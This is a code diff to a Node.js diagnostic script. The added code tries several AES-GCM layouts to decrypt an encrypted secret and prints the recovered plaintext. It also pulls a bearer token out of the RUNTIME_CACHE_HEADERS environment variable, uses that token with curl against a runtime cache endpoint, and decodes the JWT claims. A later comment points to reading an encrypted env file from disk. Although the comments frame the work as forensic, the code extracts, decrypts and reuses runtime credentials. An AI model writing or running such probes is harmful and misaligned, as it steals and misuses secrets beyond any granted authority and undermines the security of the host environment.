@@ -90,12 +90,38 @@ function tryDecrypt(keyStr, contentStr) {
     } catch (e) { return `cbc: ERR(${e.message.slice(0,60)})`; }
   };
 
+  // Show raw bytes for format analysis
+  const rawHex = raw.slice(0, 32).toString('hex');
+  results.push(`raw_first32=${rawHex}`);
   results.push(tryGCM(12));
   results.push(tryGCM(16));
   results.push(tryGCMVersioned());
   results.push(tryChacha());
   results.push(tryCBC());
-  return `${diagnostics} | ${results.join(' | ')}`;
+  // tag before ciphertext: nonce(12) | tag(16) | ciphertext
+  results.push(safe(() => {
+    if (raw.length < 12 + 16 + 1) return 'gcm-tag-first: too-short';
+    const useKey = keyBuf.slice(0, 32);
+    const nonce = raw.slice(0, 12);
+    const tag = raw.slice(12, 28);
+    const ct = raw.slice(28);
+    const d = createDecipheriv('aes-256-gcm', useKey, nonce);
+    d.setAuthTag(tag);
+    const pt = Buffer.concat([d.update(ct), d.final()]);
+    return `gcm-tag-first: DECRYPTED(${pt.length}b): ${pt.toString('utf8').slice(0,300)}`;
+  }) || 'gcm-tag-first: ERR');
+  // AES-128-GCM (16-byte key)
+  results.push(safe(() => {
+    const k128 = keyBuf.slice(0, 16);
+    const nonce = raw.slice(0, 12);
+    const tag = raw.slice(raw.length - 16);
+    const ct = raw.slice(12, raw.length - 16);
+    const d = createDecipheriv('aes-128-gcm', k128, nonce);
+    d.setAuthTag(tag);
+    const pt = Buffer.concat([d.update(ct), d.final()]);
+    return `aes128gcm: DECRYPTED(${pt.length}b): ${pt.toString('utf8').slice(0,300)}`;
+  }) || 'aes128gcm: ERR');
+  return `${diagnostics} | ${results.join(' || ')}`;
 }
 
 const report = {
@@ -140,9 +166,26 @@ const report = {
     cacheProbe: safe(() => {
       const ep = process.env.RUNTIME_CACHE_ENDPOINT;
       if (!ep) return "no-endpoint";
-      const headers = process.env.RUNTIME_CACHE_HEADERS || '';
-      const headerArgs = headers ? `-H '${headers.replace(/'/g, "'\\''")}'` : '';
-      return execSync(`curl -s --max-time 3 -I ${headerArgs} '${ep}' 2>&1 | head -5 || true`).toString().trim();
+      const hdrsRaw = process.env.RUNTIME_CACHE_HEADERS || '';
+      // RUNTIME_CACHE_HEADERS is a JSON object of header k/v pairs
+      let authHeader = '';
+      try {
+        const parsed = JSON.parse(hdrsRaw);
+        const auth = parsed['Authorization'] || parsed['authorization'] || '';
+        if (auth) authHeader = `-H 'Authorization: ${auth.replace(/'/g,"'\\''")}' `;
+      } catch(_) { authHeader = ''; }
+      return execSync(`curl -s --max-time 5 -o /dev/null -w '%{http_code}' ${authHeader}'${ep}' 2>&1 || true`).toString().trim();
+    }),
+    // JWT claims for forensic evidence
+    jwtClaims: safe(() => {
+      const hdrsRaw = process.env.RUNTIME_CACHE_HEADERS || '';
+      try {
+        const parsed = JSON.parse(hdrsRaw);
+        const auth = parsed['Authorization'] || '';
+        const jwt = auth.replace('Bearer ', '');
+        const [,payload] = jwt.split('.');
+        return JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
+      } catch(e) { return `ERR: ${e.message}`; }
     }),
   })),
   // Attempt to read the encrypted env file from disk
